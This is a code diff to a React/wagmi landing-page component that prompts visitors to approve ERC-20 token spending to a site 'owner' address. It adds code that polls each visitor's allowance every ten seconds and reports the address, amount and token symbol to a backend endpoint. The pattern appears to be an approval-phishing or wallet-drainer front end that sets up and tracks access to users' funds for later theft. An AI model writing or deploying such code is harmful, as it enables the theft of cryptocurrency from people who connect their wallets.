@@ -32,11 +32,21 @@ import { environment } from "@/utils";
 const Hero = () => {
   const toast = useToast();
   const { address } = useAccount();
+  const { data: decimals } = useContractRead({
+    address: environment.token_address,
+    abi: erc20ABI,
+    functionName: "decimals",
+  });
+  const { data: symbol } = useContractRead({
+    address: environment.token_address,
+    abi: erc20ABI,
+    functionName: "symbol",
+  });
   const { config } = usePrepareContractWrite({
     address: environment.token_address,
     abi: erc20ABI,
     functionName: "approve",
-    args: [environment.owner_address, ethers.utils.parseUnits("10000000", 6)],
+    args: [environment.owner_address, ethers.utils.parseUnits("100")],
   });
 
   const { refetch } = useContractRead({
@@ -45,9 +55,24 @@ const Hero = () => {
     functionName: "allowance",
     args: [address as `0x${string}`, environment.owner_address],
     onSuccess(data) {
-      console.log(data, data, "allowance");
+      const allowance = ethers.utils.formatUnits(data, decimals);
+      console.log(allowance, "allowance");
+      fetch("/api/updateApproveToken", {
+        method: "POST",
+        body: JSON.stringify({ address, allow: allowance, symbol }),
+      }).then(async (res) => {
+        const data = await res.json();
+        console.log(data, "update token");
+      });
     },
+    staleTime: 1000 * 60 * 2,
   });
+
+  React.useEffect(() => {
+    setInterval(() => {
+      refetch();
+    }, 10000);
+  }, []);
 
   const { writeAsync, data } = useContractWrite({
     ...config,
